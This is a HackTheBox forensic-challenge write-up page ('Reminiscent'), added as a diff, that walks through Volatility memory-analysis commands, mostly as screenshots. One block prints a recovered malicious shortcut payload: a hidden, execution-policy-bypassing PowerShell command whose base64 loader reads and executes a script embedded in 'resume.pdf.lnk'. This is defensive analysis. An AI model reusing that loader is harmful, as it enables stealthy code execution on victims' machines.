@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Reminiscent(Forensic Challenge) · the-grizzly-bear</title>
+<meta name="description" content="Reminiscent(Forensic Challenge) — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-challenges/reminiscent-forensic-challenge.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Challenges</a></div>
+<h1 id="title">Reminiscent(Forensic Challenge)</h1>
+
+<p>volatility</p>
+<p><a href="https://github.com/volatilityfoundation/volatility/wiki/Installation" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Installation</a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled.png"><img src="reminiscent-forensic-challenge/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-1.png"><img src="reminiscent-forensic-challenge/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-2.png"><img src="reminiscent-forensic-challenge/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">imageinfo -f</code></pre>
+<pre><code class="language-bash">Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
+AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
+AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)</code></pre>
+<pre><code class="language-bash">specify profile</code></pre>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-3.png"><img src="reminiscent-forensic-challenge/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">pslist</code></pre>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-4.png"><img src="reminiscent-forensic-challenge/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-5.png"><img src="reminiscent-forensic-challenge/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-6.png"><img src="reminiscent-forensic-challenge/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">psscan</code></pre>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-7.png"><img src="reminiscent-forensic-challenge/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-8.png"><img src="reminiscent-forensic-challenge/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-9.png"><img src="reminiscent-forensic-challenge/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">consoles</code></pre>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-10.png"><img src="reminiscent-forensic-challenge/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-11.png"><img src="reminiscent-forensic-challenge/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">filescan</code></pre>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-12.png"><img src="reminiscent-forensic-challenge/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">physoffset</code></pre>
+<pre><code class="language-bash">[vol.py](http://vol.py/) --profile=Win7SP1x64 dumpfiles --physoffset 0x000000001e8feb70 -f ../../../Downloads/reminiscent/flounder-pc-memdump.elf --dump-dir ../../htb/</code></pre>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-13.png"><img src="reminiscent-forensic-challenge/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-14.png"><img src="reminiscent-forensic-challenge/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-15.png"><img src="reminiscent-forensic-challenge/untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">C:\R1DKfpWindows��:��DKfp*�WindowsV1DK�eSystem32��:��DK�e*'	Sv1.0h2��IL powershell.exe�K6}K6}*��powershell.exeh-g�rk�C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe?..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe�-win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7')); iex $r;C:\Windows\system32\SHELL32.dll�%SystemRoot%\system32\SHELL32.dll%SystemRoot%\system32\SHELL32.dll�%�</code></pre>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-16.png"><img src="reminiscent-forensic-challenge/untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-17.png"><img src="reminiscent-forensic-challenge/untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-18.png"><img src="reminiscent-forensic-challenge/untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="reminiscent-forensic-challenge/untitled-19.png"><img src="reminiscent-forensic-challenge/untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
